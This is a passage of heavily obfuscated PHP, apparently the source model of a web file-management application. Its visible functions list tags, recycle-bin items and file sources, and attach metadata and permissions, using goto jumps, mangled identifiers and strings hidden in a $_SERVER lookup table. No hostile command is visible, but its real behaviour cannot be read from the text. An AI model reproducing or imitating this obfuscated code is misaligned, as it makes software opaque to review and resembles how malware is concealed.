$dçÆﬁ∂π£œ))); } $FΩÃ±“÷‡ = array_to_keyvalue($FΩÃ±“÷‡[$cé°ƒë«ã“[367]], $cé°ƒë«ã“[395]); goto F◊ç’€£ÌÌ; b•ﬂéµ÷Ø≥: $cé°ƒë«ã“ =& $_SERVER[ú∫]; $c‘úÒâ≠•‹ = Model($cé°ƒë«ã“[408])->listData(); $dçÆﬁ∂π£œ = array_filter_by_field($c‘úÒâ≠•‹, $cé°ƒë«ã“[29], $cé°ƒë«ã“[409]); goto cáóªàœÈè; f¿ö±Àâéé: } public function listUserTag($Eê∞“⁄Çáâ) { goto f≠∞äŒâ¥‚; cæøÎ–ƒ›¿: $fàÒ·•ö“Ç = array(); foreach ($b÷âã≥ﬂΩù as $eã„ﬁ¬ü§ﬂ) { $aáôäøïµ‚ = $eã„ﬁ¬ü§ﬂ[$eëµí§ô”†[76]]; if (!$aáôäøïµ‚) { continue; } if (!isset($fàÒ·•ö“Ç[$aáôäøïµ‚])) { $fàÒ·•ö“Ç[$aáôäøïµ‚] = array(); } $fàÒ·•ö“Ç[$aáôäøïµ‚][] = $eã„ﬁ¬ü§ﬂ[$eëµí§ô”†[419]]; } $câéò≥°º∞ = array(); goto f÷Ÿ≈¶ßÖ¬; eÖ£ãëöüÇ: $FÍôÓ—â◊Ó = array_to_keyvalue($aÖ≠à≥∏ù¨[$eëµí§ô”†[74]], $eëµí§ô”†[33], $eëµí§ô”†[395]); $D≥Ç“ Öç£ = array_merge($FÍôÓ—â◊Ó, $FÇˆˆ‹Ü‰…); foreach ($câéò≥°º∞ as $aáôäøïµ‚) { if (!in_array($aáôäøïµ‚, $D≥Ç“ Öç£)) { $eìï‘†‡ÛΩ[] = $aáôäøïµ‚; } } goto Fòëë◊∫‘´; Fà€Ÿ©ΩÙ∫: if (!$aÖ≠à≥∏ù¨ || count($câéò≥°º∞) == $aÖ≠à≥∏ù¨[$eëµí§ô”†[364]][$eëµí§ô”†[365]]) { return $aÖ≠à≥∏ù¨; } $eìï‘†‡ÛΩ = array(); $FÇˆˆ‹Ü‰… = array_to_keyvalue($aÖ≠à≥∏ù¨[$eëµí§ô”†[75]], $eëµí§ô”†[33], $eëµí§ô”†[395]); goto eÖ£ãëöüÇ; Fòëë◊∫‘´: if ($eìï‘†‡ÛΩ) { Model($eëµí§ô”†[420])->removeBySource($eìï‘†‡ÛΩ); } return $aÖ≠à≥∏ù¨; goto Bß„–≥Úæ˘; f≠∞äŒâ¥‚: $eëµí§ô”† =& $_SERVER[ú∫]; if ($Eê∞“⁄Çáâ && !is_array($Eê∞“⁄Çáâ)) { $Eê∞“⁄Çáâ = array($Eê∞“⁄Çáâ); } $b÷âã≥ﬂΩù = Model($eëµí§ô”†[418])->listData(); goto cæøÎ–ƒ›¿; f÷Ÿ≈¶ßÖ¬: foreach ($fàÒ·•ö“Ç as $DÌôºçøÒ± => $AÚ‡éë¢ÎÒ) { $D“©Âø’ªß = !0; if (!$Eê∞“⁄Çáâ) { $câéò≥°º∞[] = $DÌôºçøÒ±; continue; } foreach ($Eê∞“⁄Çáâ as $d¢À‚≈∞Èâ) { if (!in_array($d¢À‚≈∞Èâ, $AÚ‡éë¢ÎÒ)) { $D“©Âø’ªß = !1; break; } } if ($D“©Âø’ªß) { $câéò≥°º∞[] = $DÌôºçøÒ±; } } if (!$câéò≥°º∞) { return array(); } $aÖ≠à≥∏ù¨ = $this->listSource(array($eëµí§ô”†[410] => array($eëµí§ô”†[411], $câéò≥°º∞))); goto Fà€Ÿ©ΩÙ∫; Bß„–≥Úæ˘: } public function listUserRecycle() { $bãÛù”ëá  =& $_SERVER[ú∫]; $D∫Æ—∞Ÿëá = Model($bãÛù”ëá [421])->listData(); if (!$D∫Æ—∞Ÿëá) { return array(); } $B¡ªˆë±¶Ã = array($bãÛù”ëá [410] => array($bãÛù”ëá [411], $D∫Æ—∞Ÿëá), $bãÛù”ëá [422] => 1); return $this->listSource($B¡ªˆë±¶Ã); } public function listSource($dóö≠Ø¥ÈÙ, $C‚êµÙ›Ω„ = 3000) { goto Dˆí≤Èçà¡; Aˆ´àáç∆Ç: $AÉíÇÂΩùü = $this->field($dÕîÇ≤∞Úê)->_makeOrder()->where($dóö≠Ø¥ÈÙ)->selectPage($C‚êµÙ›Ω„); $this->_listDataApply($AÉíÇÂΩùü[$Còãî‹‡ùƒ[367]]); $this->_listMake($AÉíÇÂΩùü); goto D±‘‘ûÜà’; D±‘‘ûÜà’: return $AÉíÇÂΩùü; goto Dà…Ωäπõå; Dˆí≤Èçà¡: $Còãî‹‡ùƒ =& $_SERVER[ú∫]; if (!isset($dóö≠Ø¥ÈÙ[$Còãî‹‡ùƒ[423]])) { $dóö≠Ø¥ÈÙ[$Còãî‹‡ùƒ[423]] = 0; } $dÕîÇ≤∞Úê = $Còãî‹‡ùƒ[424]; goto Aˆ´àáç∆Ç; Dà…Ωäπõå: } protected function _makeOrder() { goto F—‰ÜÓé‰ƒ; cﬁ∫êËêêµ: if ($aÉÀøµ∆Ê¥ == $e”ãªè©íä[28]) { } $b€Ì–¿®éÊ = $e”ãªè©íä[437] . $F¿≤ﬁœ˘Ùô[$aÉÀøµ∆Ê¥] . $e”ãªè©íä[50] . $BãÜâÕÛæÍ[$dçí™ÌÌåÊ]; return $this->order(rtrim(trim($b€Ì–¿®éÊ), $e”ãªè©íä[47])); goto Bç◊›’ñÃ; d¢¨™§ÿØ∞: $BãÜâÕÛæÍ = array($e”ãªè©íä[428] => $e”ãªè©íä[429], $e”ãªè©íä[430] => $e”ãªè©íä[431]); $F¿≤ﬁœ˘Ùô = array($e”ãªè©íä[28] => $e”ãªè©íä[28], $e”ãªè©íä[78] => $e”ãªè©íä[78], $e”ãªè©íä[168] => $e”ãªè©íä[405], $e”ãªè©íä[432] => $e”ãªè©íä[432], $e”ãªè©íä[433] => $e”ãªè©íä[434], $e”ãªè©íä[194] => $e”ãªè©íä[194], $e”ãªè©íä[84] => $e”ãªè©íä[84]); $aÉÀøµ∆Ê¥ = Input::get($e”ãªè©íä[435], $e”ãªè©íä[7], $d˘Ø©´‘à, array_keys($F¿≤ﬁœ˘Ùô)); goto F¡±°¨ëÌ¨; F¡±°¨ëÌ¨: $dçí™ÌÌåÊ = Input::get($e”ãªè©íä[436], $e”ãªè©íä[7], $b€ê›á–ë, array_keys($BãÜâÕÛæÍ)); if (!in_array($aÉÀøµ∆Ê¥, array_keys($F¿≤ﬁœ˘Ùô))) { $aÉÀøµ∆Ê¥ = $e”ãªè©íä[28]; } if (!in_array($dçí™ÌÌåÊ, array_keys($BãÜâÕÛæÍ))) { $aÉÀøµ∆Ê¥ = $e”ãªè©íä[428]; } goto cﬁ∫êËêêµ; F—‰ÜÓé‰ƒ: $e”ãªè©íä =& $_SERVER[ú∫]; $d˘Ø©´‘à = Model($e”ãªè©íä[425])->get($e”ãªè©íä[426]); $b€ê›á–ë = Model($e”ãªè©íä[425])->get($e”ãªè©íä[427]); goto d¢¨™§ÿØ∞; Bç◊›’ñÃ: } protected function _listDataApplyItem($C‡…Ö§§∏¶, $aÖ≤Ïı¢ÉÙ = false) { $Fÿ√€á‡®ï = array($C‡…Ö§§∏¶); $this->_listDataApply($Fÿ√€á‡®ï, $aÖ≤Ïı¢ÉÙ); return $Fÿ√€á‡®ï[0]; } protected function _listDataApply(&$eÆ∞îÖ≈Ω‚, $Cßã‹Íÿ√± = false) { goto fõ ¨õ≥éÉ; B”˜Îæõíú: $this->_listAppendUser($eÆ∞îÖ≈Ω‚); $this->_listFilterInfo($eÆ∞îÖ≈Ω‚, $Cßã‹Íÿ√±); goto bÇ≤ú™û”ø; c·™É˘≈∂£: $this->_listAppendPath($eÆ∞îÖ≈Ω‚); $this->_listAppendAuth($eÆ∞îÖ≈Ω‚); $this->_listAppendSourceInfo($eÆ∞îÖ≈Ω‚, $càƒ◊éªÿâ); goto B”˜Îæõíú; fõ ¨õ≥éÉ: $Cƒä«çó∞å =& $_SERVER[ú∫]; if (!$eÆ∞îÖ≈Ω‚) { $eÆ∞îÖ≈Ω‚ = array(); return; } $càƒ◊éªÿâ = array_to_keyvalue($eÆ∞îÖ≈Ω‚, $Cƒä«çó∞å[33], $Cƒä«çó∞å[395]); goto d€°µì≈ˆç; d€°µì≈ˆç: $càƒ◊éªÿâ = array_unique($càƒ◊éªÿâ); $this->_listSourceCache($eÆ∞îÖ≈Ω‚); if (!$Cßã‹Íÿ√±) { $this->_listAppendMeta($eÆ∞îÖ≈Ω‚, $càƒ◊éªÿâ); $this->_listAppendFileMeta($eÆ∞îÖ≈Ω‚, $càƒ◊éªÿâ); $this->_listAppendChildren($eÆ∞îÖ≈Ω‚, $càƒ◊éªÿâ); } goto c·™É˘≈∂£; bÇ≤ú™û”ø: } protected function _listSourceCache($CÔœö¯ÎÓ) { $aÜÏÃáÙéª =& $_SERVER[ú∫]; foreach ($CÔœö¯ÎÓ as $cŒÂÁØ´Éÿ) { self::$cacheSourceInfo[$aÜÏÃáÙéª[438] . $cŒÂÁØ´Éÿ[$aÜÏÃáÙéª[395]]] = $cŒÂÁØ´Éÿ; } } protected function _listFilterInfo(&$EÕ⁄∞åÖÓÖ, $EÒÀé°€ñ≠ = false) { $eåâùã±“è =& $_SERVER[ú∫]; foreach ($EÕ⁄∞åÖÓÖ as &$E∏º•™òÖ≤) { $E∏º•™òÖ≤ = $this->pathInfoFilter($E∏º•™òÖ≤); self::$cachePathInfo[$eåâùã±“è[439] . intval($EÒÀé°€ñ≠) . $eåâùã±“è[440] . $E∏º•™òÖ≤[$eåâùã±“è[395]]] = $E∏º•™òÖ≤; } unset($E∏º•™òÖ≤); } protected function _listMake(&$c·à‚Úé∂ë) { $B∑ÜÏ¡◊∏¢ =& $_SERVER[ú∫]; $c·à‚Úé∂ë[$B∑ÜÏ¡◊∏¢[75]] = array(); $c·à‚Úé∂ë[$B∑ÜÏ¡◊∏¢[74]] = array(); foreach ($c·à‚Úé∂ë[$B∑ÜÏ¡◊∏¢[367]] as $DìãèóÒ») { $Bâ∂ÏÕ€Ã  = $DìãèóÒ»[$B∑ÜÏ¡◊∏¢[403]] == 1 ? $B∑ÜÏ¡◊∏¢[75] : $B∑ÜÏ¡◊∏¢[74]; $c·à‚Úé∂ë[$Bâ∂ÏÕ€Ã ][] = $DìãèóÒ»; } unset($c·à‚Úé∂ë[$B∑ÜÏ¡◊∏¢[367]]); } protected function _listAppendMeta(&$f∫›¬ñÜˆ‡, $C¨à¶≥π É) { goto DÌñë•¿ü´; Aå‘∞⁄–˘‚: foreach ($b“ŒôÃî¬´ as $BôÂçÑË∆é) { if (!isset($E†‚ÂÎ’ñè[$BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[395]]])) { $E†‚ÂÎ’ñè[$BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[395]]] = array(); } if (in_array($BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[93]], $aÂì¶”àÿ)) { continue; } $E†‚ÂÎ’ñè[$BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[395]]][$BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[93]]] = $BôÂçÑË∆é[$E¢ÊÃˆÙ ∞[372]]; } foreach ($f∫›¬ñÜˆ‡ as &$Dƒò≥êí∆…) { $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[445]] = !1; if (isset($E†‚ÂÎ’ñè[$Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[395]]])) { $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[445]] = $E†‚ÂÎ’ñè[$Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[395]]]; } if ($this->fileIsLock($Dƒò≥êí∆…) && $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[406]]) { $AÑ¨∞±Æ§‘ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[406]][$E¢ÊÃˆÙ ∞[407]] = AuthModel::authDisable($Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[406]][$E¢ÊÃˆÙ ∞[407]], $AÑ¨∞±Æ§‘); $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[406]][$E¢ÊÃˆÙ ∞[446]][$E¢ÊÃˆÙ ∞[406]] = $Dƒò≥êí∆…[$E¢ÊÃˆÙ ∞[406]][$E¢ÊÃˆÙ ∞[407]]; } } unset($Dƒò≥êí∆…); goto Dèπ¡øë·ç; FäÃ’öΩ’ß: if (!$b“ŒôÃî¬´) { return; } $aÂì¶”àÿ = array($E¢ÊÃˆÙ ∞[443], $E¢ÊÃˆÙ ∞[444]); $E†‚ÂÎ’ñè = array(); goto Aå‘∞⁄–˘‚; DÌñë•¿ü´: $E¢ÊÃˆÙ ∞ =& $_SERVER[ú∫]; $f ‡ïù≠Òô = array($E¢ÊÃˆÙ ∞[410] => array($E¢ÊÃˆÙ ∞[411], $C¨à¶≥π É)); $b“ŒôÃî¬´ = Model($E¢ÊÃˆÙ ∞[441])->field($E¢ÊÃˆÙ ∞[442])->where($f ‡ïù≠Òô)->select(); goto FäÃ’öΩ’ß; Dèπ¡øë·ç: } protected function _listAppendFileMeta(&$C’Ò∑⁄ÿ≠æ, $cîæ»ÏÁÎ) { goto Cò◊ƒ∑∆áç; e∆ﬂåªΩß’: foreach ($C’Ò∑⁄ÿ≠æ as &$Dﬁ∞ñ±êè≥) { goto dÚ‘±„–·»; F¢¯ì∏·ë€: $C˜√çúëÃ≥[$EÍ˜æ∆ˆç[78]] = $Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[78]]; $C˜√çúëÃ≥[$EÍ˜æ∆ˆç[28]] = $Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[28]]; if (!isset(self::$cacheFileInfo[$EÍ˜æ∆ˆç[453] . $A•–Òå«í†])) { self::$cacheFileInfo[$EÍ˜æ∆ˆç[453] . $A•–Òå«í†] = array_merge(array(), $C˜√çúëÃ≥); } goto b≥≈Ø…—¿Ò; b≥≈Ø…—¿Ò: unset($cüò•·ñª¥[$A•–Òå«í†][$EÍ˜æ∆ˆç[76]]); $bÜ–öÒõ‰É = is_array($f≤ëÑŸâÌñ[$A•–Òå«í†]) ? $f≤ëÑŸâÌñ[$A•–Òå«í†] : array(); $Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[164]] = array_merge($bÜ–öÒõ‰É, $cüò•·ñª¥[$A•–Òå«í†]); goto DÍ®ˆê≈¥™; dÚ‘±„–·»: $A•–Òå«í† = $Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[447]]; if (!$A•–Òå«í† || !is_array($cüò•·ñª¥[$A•–Òå«í†])) { continue; } $C˜√çúëÃ≥ = $cüò•·ñª¥[$A•–Òå«í†]; goto F¢¯ì∏·ë€; DÍ®ˆê≈¥™: if (isset($Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[164]][$EÍ˜æ∆ˆç[163]])) { $Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[163]] = json_decode($Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[164]][$EÍ˜æ∆ˆç[163]], !0); unset($Dﬁ∞ñ±êè≥[$EÍ˜æ∆ˆç[164]][$EÍ˜æ∆ˆç[163]]); } goto f¯ôÿÖ·Õ—; f¯ôÿÖ·Õ—: } unset($Dﬁ∞ñ±êè≥); goto cÊãâÑ¯·°; A⁄— êﬁõÎ: if (!$a∆éﬁ°„ÿ) { return; } $e·¯ã◊ıŸ• = array($EÍ˜æ∆ˆç[448] => array($EÍ˜æ∆ˆç[411], $a∆éﬁ°„ÿ)); $b÷Ö·ÖÕÖ◊ = $EÍ˜æ∆ˆç[449]; goto D±€ﬂß·éÍ; cï‰ãœ≠Ú¶: $FÕ®Ó¯£åæ = $FÕ®Ó¯£åæ ? $FÕ®Ó¯£åæ : array(); $f≤ëÑŸâÌñ = array(); foreach ($FÕ®Ó¯£åæ as $dà∆›Ú‡Û©) { if (!isset($f≤ëÑŸâÌñ[$dà∆›Ú‡Û©[$EÍ˜æ∆ˆç[447]]])) { $f≤ëÑŸâÌñ[$dà∆›Ú‡Û©[$EÍ˜æ∆ˆç[447]]] = array(); } $f≤ëÑŸâÌñ[$dà∆›Ú‡Û©[$EÍ˜æ∆ˆç[447]]][$dà∆›Ú‡Û©[$EÍ˜æ∆ˆç[93]]] = $dà∆›Ú‡Û©[$EÍ˜æ∆ˆç[372]]; } goto e∆ﬂåªΩß’; D±€ﬂß·éÍ: $cüò•·ñª¥ = Model($EÍ˜æ∆ˆç[450])->field($b÷Ö·ÖÕÖ◊)->where($e·¯ã◊ıŸ•)->select(); $cüò•·ñª¥ = array_to_keyvalue($cüò•·ñª¥, $EÍ˜æ∆ˆç[447]); $FÕ®Ó¯£åæ = Model($EÍ˜æ∆ˆç[451])->field($EÍ˜æ∆ˆç[452])->where($e·¯ã◊ıŸ•)->select(); goto cï‰ãœ≠Ú¶; Cò◊ƒ∑∆áç: $EÍ˜æ∆ˆç =& $_SERVER[ú∫]; $a∆éﬁ°„ÿ = array_to_keyvalue($C’Ò∑⁄ÿ≠æ, $EÍ˜æ∆ˆç[33], $EÍ˜æ∆ˆç[447]); $a∆éﬁ°„ÿ = array_filter(array_unique($a∆éﬁ°„ÿ)); goto A⁄— êﬁõÎ; cÊãâÑ¯·°: } protected function _listAppendSourceInfo(&$däØóñú‘è, $F€ªÇ˘¶…€) { goto e«æÖ–•£ê; e¬ŸŒã”™‡: return $däØóñú‘è; goto B”ã¡’Ô∞£; DËì’ÇÔ≈ﬂ: $D•Èà•Ñ”• = Model($BÕ”ÂØ’êœ[418])->listData(); $e±˜˜¯ë∫• = Model($BÕ”ÂØ’êœ[408])->listData(); $cÚ∏” áÛ± = Model($BÕ”ÂØ’êœ[456])->listSimple(); goto dﬁªÕïÀÛ©; e«æÖ–•£ê: $BÕ”ÂØ’êœ =& $_SERVER[ú∫]; if (!defined($BÕ”ÂØ’êœ[454])) { return; } $DÛüô±Ó˜ç = Model($BÕ”ÂØ’êœ[455])->listData(); goto DËì’ÇÔ≈ﬂ; dﬁªÕïÀÛ©: $DØΩ¯áâ∫À = array_to_keyvalue($DÛüô±Ó˜ç, $BÕ”ÂØ’êœ[393]); $EÍ„åØêŒô = array_to_keyvalue_group($D•Èà•Ñ”•, $BÕ”ÂØ’êœ[76], $BÕ”ÂØ’êœ[419]); $aÈÔÖ¬ñ“ø = array_to_keyvalue($e±˜˜¯ë∫•, $BÕ”ÂØ’êœ[76]); goto BëÈÚìèœﬂ; BëÈÚìèœﬂ: $bƒÓ±Ç◊œ‘ = array_to_keyvalue_group($cÚ∏” áÛ±, $BÕ”ÂØ’êœ[395]); foreach ($däØóñú‘è as &$F«≤º€ÃˆÊ) { $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]] = array($BÕ”ÂØ’êœ[457] => 0, $BÕ”ÂØ’êœ[458] => 0, $BÕ”ÂØ’êœ[459] => 0); if (isset($aÈÔÖ¬ñ“ø[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]])) { $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[460]] = 1; $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[461]] = $aÈÔÖ¬ñ“ø[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]][$BÕ”ÂØ’êœ[28]]; } if (isset($EÍ„åØêŒô[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]])) { $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[462]] = array(); foreach ($EÍ„åØêŒô[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]] as $eÂ¡úÍáìÇ) { $DÛ†∞ÀÀ‰ﬂ = $DØΩ¯áâ∫À[$eÂ¡úÍáìÇ]; $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[462]][] = array($BÕ”ÂØ’êœ[463] => $DÛ†∞ÀÀ‰ﬂ[$BÕ”ÂØ’êœ[393]], $BÕ”ÂØ’êœ[413] => $DÛ†∞ÀÀ‰ﬂ[$BÕ”ÂØ’êœ[28]], $BÕ”ÂØ’êœ[464] => $DÛ†∞ÀÀ‰ﬂ[$BÕ”ÂØ’êœ[465]]); } } if (isset($bƒÓ±Ç◊œ‘[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]])) { $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[466]] = array(); foreach ($bƒÓ±Ç◊œ‘[$F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[395]]] as $aËíÑ–“ºã) { $F«≤º€ÃˆÊ[$BÕ”ÂØ’êœ[85]][$BÕ”ÂØ’êœ[466]] = array($BÕ”ÂØ’êœ[467] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[468]], $BÕ”ÂØ’êœ[469] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[470]], $BÕ”ÂØ’êœ[471] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[395]], $BÕ”ÂØ’êœ[472] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[473]], $BÕ”ÂØ’êœ[474] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[475]], $BÕ”ÂØ’êœ[476] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[476]], $BÕ”ÂØ’êœ[477] => $aËíÑ–“ºã[$BÕ”ÂØ’êœ[477]]); } } } unset($F«≤º€ÃˆÊ); goto e¬ŸŒã”™‡; B”ã¡’Ô∞£: } protected function _listAppendChildren(&$E„‹ÏàéÆﬂ, $Dô€öá°˜à) { goto Eµ…ªËˆ≠ë; A’ªµ·ö∂Ø: $b€ë¡Çë≠∆ = array($fÙ›ê≈ç˘°[478] => array($fÙ›ê≈ç˘°[7], $aØπÔ‹ÇÔç)); $CÏ¶°Ò‚‹è = array($fÙ›ê≈ç˘°[478], $fÙ›ê≈ç˘°[403], $fÙ›ê≈ç˘°[479] => $fÙ›ê≈ç˘°[480]); $DçÇ‡ÃÊ⁄Õ = $this->field($CÏ¶°Ò‚‹è)->where($b€ë¡Çë≠∆)->group($fÙ›ê≈ç˘°[481])->select(); goto f⁄çûàÕ˘ë; D⁄…—Ö™≈Ù: foreach ($E„‹ÏàéÆﬂ as &$cÉèëƒå°ì) { if (!$cÉèëƒå°ì[$fÙ›ê≈ç˘°[403]]) { continue; } $aØπÔ‹ÇÔç[] = $cÉèëƒå°ì[$fÙ›ê≈ç˘°[395]]; } unset($cÉèëƒå°ì); if (!$aØπÔ‹ÇÔç) { return; } goto A’ªµ·ö∂Ø; f⁄çûàÕ˘ë: $FÒåÌ÷¯ÒÓ = array(); foreach ($DçÇ‡ÃÊ⁄Õ as $CÛ‘Ñß”ﬂ£) { $cÖõı±êáÁ = $CÛ‘Ñß”ﬂ£[$fÙ›ê≈ç˘°[478]]; $Dö∂œ⁄ÕŒû = $CÛ‘Ñß”ﬂ£[$fÙ›ê≈ç˘°[403]] == $fÙ›ê≈ç˘°[87] ? $fÙ›ê≈ç˘°[204] : $fÙ›ê≈ç˘°[203]; if (!isset($FÒåÌ÷¯ÒÓ[$cÖõı±êáÁ])) { $FÒåÌ÷¯ÒÓ[$cÖõı±êáÁ] = array($fÙ›ê≈ç˘°[203] => 0, $fÙ›ê≈ç˘°[204] => 0); } $FÒåÌ÷¯ÒÓ[$cÖõı±êáÁ][$Dö∂œ⁄ÕŒû] += $CÛ‘Ñß”ﬂ£[$fÙ›ê≈ç˘°[480]]; } foreach ($E„‹ÏàéÆﬂ as &$cÉèëƒå°ì) { if (!$cÉèëƒå°ì[$fÙ›ê≈ç˘°[403]]) { continue; } $b±⁄åß‹Ü∫ = is_array($FÒåÌ÷¯ÒÓ[$cÉèëƒå°ì[$fÙ›ê≈ç˘°[395]]]) ? $FÒåÌ÷¯ÒÓ[$cÉèëƒå°ì[$fÙ›ê≈ç˘°[395]]] : $b‘∫∏ø‚¿º; $cÉèëƒå°ì[$fÙ›ê≈ç˘°[204]] = $b±⁄åß‹Ü∫[$fÙ›ê≈ç˘°[204]]; $cÉèëƒå°ì[$fÙ›ê≈ç˘°[203]] = $b±⁄åß‹Ü∫[$fÙ›ê≈ç˘°[203]]; unset($cÉèëƒå°ì[$fÙ›ê≈ç˘°[405]]); } goto A·Ö‡ö◊É…; A·Ö‡ö◊É…: unset($cÉèëƒå°ì); goto B¨—÷˘’∑è; Eµ…ªËˆ≠ë: $fÙ›ê≈ç˘° =& $_SERVER[ú∫]; $aØπÔ‹ÇÔç = array(); $b‘∫∏ø‚¿º = array($fÙ›ê≈ç˘°[203] => 0, $fÙ›ê≈ç˘°[204] => 0); goto D⁄…—Ö™≈Ù; B¨—÷˘’∑è: } protected function _listAppendAuth(&$d¶´È®–Ω˜) { goto aå§¡ï Œú; bìÉ¡Çß≠Ë: foreach ($d¶´È®–Ω˜ as $eﬁÏ§ﬂ©È’) { if ($eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[404]] == self::TYPE_GROUP) { $a∞ﬁÔµ–¨ö[] = $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[395]]; } } if (!$a∞ﬁÔµ–¨ö) { return; } $BìÉ¬Ω≈∞¯ = array_to_keyvalue($d¶´È®–Ω˜, $fúÛ†ÙÍ›[395]); goto f¯ÖÉÇçù≤; f¯ÖÉÇçù≤: $Dìöæª·àè = Model($fúÛ†ÙÍ›[482])->getSourceList($a∞ﬁÔµ–¨ö, $BìÉ¬Ω≈∞¯); foreach ($d¶´È®–Ω˜ as $bˆüâÉﬁ∫¥ => &$eﬁÏ§ﬂ©È’) { $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]] = $Dìöæª·àè[$eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[395]]]; if (!$eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]] && $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[404]] == self::TYPE_GROUP) { $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]] = Action($fúÛ†ÙÍ›[483])->pathGroupAuthMake($eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[484]]); if (!$eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]] && !_get($GLOBALS, $fúÛ†ÙÍ›[485])) { $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[196]] = !1; $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[195]] = !1; } } if ($eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]]) { $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[196]] = AuthModel::authCheckEdit($eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]][$fúÛ†ÙÍ›[407]]); $eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[195]] = AuthModel::authCheckView($eﬁÏ§ﬂ©È’[$fúÛ†ÙÍ›[406]][$fúÛ†ÙÍ›[407]]); } $this->groupPathDisplay($eﬁÏ§ﬂ©È’); } unset($eﬁÏ§ﬂ©È’); goto Fà⁄µπ–áÚ; aå§¡ï Œú: $fúÛ†ÙÍ› =& $_SERVER[ú∫]; if (!defined($fúÛ†ÙÍ›[454])) { return; } $a∞ﬁÔµ–¨ö = array(); goto bìÉ¡Çß≠Ë; Fà⁄µπ–áÚ: } public function groupPathDisplay(&$bœ‚àä´›·) { goto Dú∫õ∆ÕÌ´; Dú∫õ∆ÕÌ´: $dœŸ´◊¨ë =& $_SERVER[ú∫]; if ($bœ‚àä´›·[$dœŸ´◊¨ë[404]] != self::TYPE_GROUP) { return; } $DùËŸÈ¥∏ = Model($dœŸ´◊¨ë[486])->getInfo($bœ‚àä´›·[$dœŸ´◊¨ë[484]]); goto Díª¯áƒÍ≈; AÛŒ‡ÙìƒÉ: $bœ‚àä´›·[$dœŸ´◊¨ë[488]] = $DùËŸÈ¥∏[$dœŸ´◊¨ë[478]]; $bœ‚àä´›·[$dœŸ´◊¨ë[489]] = $DùËŸÈ¥∏[$dœŸ´◊¨ë[487]]; $bœ‚àä´›·[$dœŸ´◊¨ë[490]] = $DùËŸÈ¥∏[$dœŸ´◊¨ë[491]]; goto B¢‰î»ñÓ◊; B¢‰î»ñÓ◊: $bœ‚àä´›·[$dœŸ´◊¨ë[492]] = $F˘∞∑Õö…ò . $DùËŸÈ¥∏[$dœŸ´◊¨ë[85]][$dœŸ´◊¨ë[395]]; goto a˘ã†¶∆µ˜; Díª¯áƒÍ≈: $FÏˆÉ∂“åﬁ = $this->parentLevelArray($DùËŸÈ¥∏[$dœŸ´◊¨ë[487]]); $F˘∞∑Õö…ò = $dœŸ´◊¨ë[33]; foreach ($FÏˆÉ∂“åﬁ as $Eú¿ù∂‡πñ) { $aÆå§´à–û = Model($dœŸ´◊¨ë[486])->getInfo($Eú¿ù∂‡πñ); $F˘∞∑Õö…ò .= $aÆå§´à–û[$dœŸ´◊¨ë[85]][$dœŸ´◊¨ë[395]] . $dœŸ´◊¨ë[47]; } goto AÛŒ‡ÙìƒÉ; a˘ã†¶∆µ˜: } protected function _listAppendPath(&$bíÚæå•˘⁄) { goto eè∫⁄∂îÌ≠; BÙ¥¥Èãõ’: unset($CŸÛ ∏ôü©); return $bíÚæå•˘⁄; goto DÁ∆ôñüı¡; c∏±»£çèî: $bë¡É∫◊Êƒ = array_unique($bë¡É∫◊Êƒ); if (count($bë¡É∫◊Êƒ) > 0) { $A¨µ®©Ω’ò = array($CÚ‰Œ€˜ê•[410] => 